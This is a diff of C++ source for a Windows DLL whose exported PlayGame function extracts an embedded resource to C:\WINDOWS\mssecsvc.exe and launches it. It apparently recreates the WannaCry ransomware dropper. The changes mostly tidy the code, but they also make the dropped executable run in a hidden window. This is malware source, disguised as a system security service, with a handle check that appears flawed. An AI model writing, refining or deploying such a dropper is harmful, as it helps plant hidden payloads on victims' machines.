@@ -20,15 +20,13 @@ int RunProcess();
 char szDest[MAX_PATH];
 HMODULE hInstDLL;
 
-extern "C" VOID __declspec(dllexport) PlayGame()
-{
+extern "C" VOID __declspec(dllexport) PlayGame() {
     sprintf(szDest, "C:\\%s\\%s", "WINDOWS", "mssecsvc.exe");
     ExtractAndCreate();
     RunProcess();
 }
 
-int ExtractAndCreate()
-{
+int ExtractAndCreate() {
     HRSRC hSrc;
     HANDLE hFile;
     DWORD NumberOfBytesToWrite = 0;
@@ -44,51 +42,35 @@ int ExtractAndCreate()
     //find out whatever 0x40000000 is
     //UPDATE: GENERIC_WRITE is 0x40000000
     hFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
-    if (!hFile)
-    {
+    if (!hFile) {
         //+4 to skip the DWORD length that's written before the actual resource
         WriteFile(hFile, (PVOID*)pRsrc + 4, ResourceSize, &NumberOfBytesToWrite, NULL);
         CloseHandle(hFile);
     }
     return 0;
 }
-
-int RunProcess()
-{
+int RunProcess() {
     PROCESS_INFORMATION ProcessInformation;
     STARTUPINFOA StartupInfo;
-    /*
-    ProcessInformation.hProcess = 0;
-    ProcessInformation.hThread = 0;
-    ProcessInformation.dwProcessId = 0;
-    */
-    //memset(&StartupInfo.lpReserved, 0, sizeof(StartupInfo));
-    /*
-    StartupInfo.cb = 104;
-    StartupInfo.wShowWindow = 0;
-    StartupInfo.dwFlags = 129;
-    */
+
+    ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));
     ZeroMemory(&StartupInfo, sizeof(StartupInfo));
     StartupInfo.cb = sizeof(StartupInfo);
-    //ZeroMemory(&StartupInfo, sizeof(StartupInfo));
-   // StartupInfo.cb = sizeof(StartupInfo);
-    //ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));
-    if(CreateProcess(NULL, (LPWSTR)szDest, NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation))
-    {
+    StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+    StartupInfo.wShowWindow = SW_HIDE;
+
+    if (CreateProcessA(NULL, (LPSTR)szDest, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInformation)) {
         CloseHandle(ProcessInformation.hThread);
         CloseHandle(ProcessInformation.hProcess);
+        return 0;
     }
-    return 0;
+
+    return 1;
 }
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
-{
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
     hInstDLL = hModule;
-    switch (ul_reason_for_call)
-    {
+    switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
         //for testing purposes; remove in final version
         MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "DLL_PROCESS_ATTACH", MB_OK);
